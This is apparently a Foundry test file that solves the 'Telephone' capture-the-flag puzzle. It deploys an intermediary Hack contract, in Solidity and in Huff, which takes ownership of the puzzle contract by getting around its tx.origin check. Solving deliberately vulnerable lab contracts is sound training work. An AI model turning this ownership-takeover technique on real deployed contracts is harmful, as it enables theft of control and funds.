// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Telephone} from "src/Challenge4-telephone/Puzzle.sol";

contract Challenge4Test is Test {
    
    Telephone public puzzle;
    address player = makeAddr("player");

    /// @dev Setup the testing environment.
    function setUp() public {
        puzzle = new Telephone();
    }

    function testSimpleHack() public {
        vm.startPrank(player);
        new Hack(address(puzzle));
        
        vm.stopPrank();
        assertEq(puzzle.owner(), player);
    }

    function testHackHuff() public {
        vm.startPrank(player);
        
        address hack = HuffDeployer
        .config()
        .with_args(abi.encode(address(puzzle)))
        .deploy("Challenge4-telephone/Hack");

        hack.call(abi.encodeWithSignature("hack(address)", address(puzzle)));

        vm.stopPrank();

        assertEq(puzzle.owner(), player);
    }
}

contract Hack {
    constructor(address _puzzle) {
        Telephone p = Telephone(_puzzle);
        p.changeOwner(msg.sender);       
    }
}